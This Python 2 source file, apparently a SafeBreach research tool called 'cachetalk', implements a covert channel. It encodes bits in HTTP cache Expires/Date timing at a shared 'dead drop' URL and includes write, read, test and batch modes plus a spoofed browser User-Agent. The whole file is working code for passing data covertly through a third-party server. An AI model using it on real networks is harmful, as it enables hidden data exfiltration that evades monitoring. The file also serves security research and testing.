#!/usr/bin/env python
# Copyright (c) 2016, SafeBreach
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import sys
import urllib2
import argparse
import time
import datetime
import email.utils
import binascii
import csv
import multiprocessing.pool

####################
# Global Variables #
####################

__version__ = "1.0"
__author__ = "Itzik Kotler"
__copyright__ = "Copyright 2016, SafeBreach"

#############
# Functions #
#############

def __wait_till_next_minute():
    sleeptime = 60 - datetime.datetime.utcnow().second
    time.sleep(sleeptime)


def __calc_delta(expires_field, date_field):
    now_date = datetime.datetime(*email.utils.parsedate(date_field)[:6])
    expires_date = datetime.datetime(*email.utils.parsedate(expires_field)[:6])
    return expires_date - now_date


def __str2bits(string):
    bits = []
    if string.startswith('0b'):
        bits = list(string[2:])
    else:
        # Convert text to binary, use the str repr to convert to list, skip 2 bytes to jump over '0b' prefix
        bits = list(bin(int(binascii.hexlify(string), 16)))[2:]
        # We're using .pop() so it's reverse() the order of the list
        bits.reverse()
    return bits


def main(args):
    parser = argparse.ArgumentParser(prog='cachetalk')
    parser.add_argument('url', metavar='URL', type=str, help='dead drop URL')
    parser.add_argument('poll_interval', metavar='SECONDS', nargs='?', type=int,
                        help='polling intervals (i.e. the delta)')
    parser.add_argument('-s', '--always-sync', action='store_true', help='always start on the top of the minute')
    parser.add_argument('-f', '--force-start', action='store_true', help='start immediately without synchronizing')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='less output')
    parser.add_argument('-1', '--try-once', action='store_true', help='try to write once and stop')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--write', nargs=1, type=str, metavar='DATA', help='connect to URL and write DATA')
    group.add_argument('-r', '--read', nargs=1, type=int, metavar='LEN', help='monitor URL and read LEN amount of bits')
    group.add_argument('-t', '--test', action='store_true', help='print HTTP Server Expires and calculate the delta')
    group.add_argument('-b', '--batch', nargs=2, type=str, metavar=('FILE.CSV', 'R|W'), help='In batch mode you can supply a file with a list of URLs, DELTAs, and 1/0\'s')
    args = parser.parse_args(args=args[1:])

    if not args.url.startswith('http'):
        args.url = 'http://' + args.url

    if args.verbose:
        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPHandler(debuglevel=1)))
        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPSHandler(debuglevel=1)))

    req_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'}
    req = urllib2.Request(args.url, headers=req_headers)

    if args.batch:

        print "START BATCH MODE"

        pool = multiprocessing.pool.ThreadPool(processes=8)
        threads = []
        batch_mode = args.batch[1].lower()
        results = []
        with open(args.batch[0], 'r') as csvfile:
            csvreader = csv.reader(csvfile)
            for row in csvreader:
                batch_argv = [sys.argv[0], '-1', '-s']
                if batch_mode == 'r':
                    batch_argv.append('-r 1')
                else:
                    batch_argv.append('-w0b' + row[2])
                batch_argv.append(row[0])
                batch_argv.append(row[1])
                print "Calling Thread w/ %s" % (batch_argv[1:])
                threads.append(pool.apply_async(main,(batch_argv,)))

        for result in threads:
            results.append(result.get())

        # That's what happened when you commit code the night before the talk ;-)
        results = reduce(lambda x,y: x+y, map(lambda x: str(x), reduce(lambda x,y: x+y, results)))

        print "END OF BATCH MODE\n\n"
        print ">>> RESULT: %s <<<" % results

    elif args.test:
        # Test-mode
        try:
            http_response = urllib2.urlopen(req)
            http_response.read()
            print '\n' + args.url + ':'
            print "=" * (len(args.url) + 1) + '\n'
            print "Expires equal to: %s" % http_response.headers['Expires']
            print "Date equal to: %s\n" % http_response.headers['Date']
            # Every hit changes Expires? Can't use URL for cache talking ...
            if http_response.headers['Expires'] == http_response.headers['Date']:
                print "NOT GOOD!"
            else:
                print "MAYBE ... (DELTA equals %s)" % __calc_delta(http_response.headers['Expires'],
                                                                   http_response.headers['Date'])
        except TypeError:
            #     expires_date = datetime.datetime(*email.utils.parsedate(expires_field)[:6])
            # TypeError: 'NoneType' object has no attribute '__getitem__'
            print "`Expires' Value is Number and not a Date! Can't calculate delta ...\n"
        except KeyError:
            # Maybe it's not Expires?
            print "Can't find `Expires' Header in HTTP Response ...\n"
        except urllib2.HTTPError as e:
            # Connection error
            print "ERROR: %s for %s" % (str(e), args.url)
    else:
        # Write/Read Mode
        first_sync = args.force_start

        bits = []
        if not args.read:
            bits = __str2bits(args.write[0])
            if not args.quiet:
                print "--- INPUT (%s) ---" % args.write[0]
                print ''.join(bits)
                print "--- INPUT = %d BITS --" % (len(bits))

        initial_poll_interval = args.poll_interval
        last_input_bit = -1
        last_poll_interval = -1
        after_fp = False
        sliding_delta = 0

        if args.read:
            if args.poll_interval < 11:
                sliding_delta = 1
            else:
                sliding_delta = 10
            args.poll_interval = args.poll_interval + sliding_delta

        while True:
            if not first_sync or args.always_sync:
                if not args.quiet:
                    print "[%s]: Synchronizing ..." % time.asctime()
                __wait_till_next_minute()
                first_sync = True

            print "[%s]: Synchronized! Need to sleep another %d second(s) ..." % (time.asctime(), args.poll_interval)
            time.sleep(args.poll_interval)
            print "[%s]: Work time!" % time.asctime()

            observed_delta = None

            if args.read:
                # Read, append bit to bits array depends on the HTTP response
                input_bit = 0
                http_response = urllib2.urlopen(req)
                http_response.read()
                # Negative delta? (Minus sliding_delta, as read interval is always + sliding_delta to give the writer a buffer)
                observed_delta = __calc_delta(http_response.headers['Expires'], http_response.headers['Date'])
                if observed_delta.total_seconds() < args.poll_interval - sliding_delta:
                    input_bit = 1
                print "(READING | R#: %d | E: %s | D: %s | D2: %s): BIT %d" % (
                    http_response.getcode(), http_response.headers['Expires'], http_response.headers['Date'],
                    observed_delta.total_seconds(), input_bit)
                if last_input_bit == 0 and input_bit == 1 and last_poll_interval == observed_delta.total_seconds():
                    args.poll_interval = observed_delta.total_seconds()
                    print "*** FALSE POSITIVE! (Ignored; Changed to 0)"
                    bits.append(0)
                    last_input_bit = 0
                    after_fp = True
                else:
                    args.poll_interval = observed_delta.total_seconds() + (sliding_delta + 1)
                    if after_fp:
                        # After False-positive and bit 1? Writer back online!
                        if input_bit == 1:
                            after_fp = False
                        else:
                            # After False-positive and bit 0? It's still False-positive ... Go back to original cycle!
                            args.poll_interval = initial_poll_interval
                    bits.append(input_bit)
                    last_input_bit = input_bit
                    last_poll_interval = args.poll_interval - (sliding_delta + 1)
                if len(bits) == args.read[0]:
                    break
            else:
                # Write, pop bit form the bits array
                try:
                    output_bit = bits.pop()
                    if output_bit == '0':
                        print "(WRITING | R#: =OFFLINE= | E: =OFFLINE= | D: =OFFLINE=): BIT 0"
                        if len(bits) == 0:
                            break
                        continue
                    while True:
                        http_response = urllib2.urlopen(req)
                        http_response.read()
                        observed_delta = __calc_delta(http_response.headers['Expires'], http_response.headers['Date'])
                        print "(WRITING | R#: %d | E: %s | D: %s | D2: %s): BIT 1" % (
                            http_response.getcode(), http_response.headers['Expires'], http_response.headers['Date'],
                            observed_delta.total_seconds())
                        if observed_delta.total_seconds() != args.poll_interval and not args.try_once:
                            print "*** RETRY!"
                            retry_sleep = observed_delta.total_seconds()
                            if retry_sleep == 0:
                                retry_sleep = 1
                            time.sleep(retry_sleep)
                            continue
                        # Do-while Writer is not aligned w/ Expires
                        break
                    if len(bits) == 0:
                        break
                except IndexError:
                    break

        if not args.quiet:
            print "!!! EOF !!!"

        if not bits:
            bits = __str2bits(args.write[0])

        if not args.quiet:
            print "--- OUTPUT ---"
            print ''.join(map(str, bits))
            print "--- OUTPUT = %d BITS --" % (len(bits))
            print " "
            n = int(''.join(map(str, bits)), 2)
            try:
                print binascii.unhexlify('%x' % n)
            except TypeError:
                # TypeError: Odd-length string if n = 0 or 1
                if len(bits) == 1:
                    pass
                else:
                    raise

        return bits

###############
# Entry Point #
###############

if __name__ == "__main__":
    sys.exit(main(sys.argv))
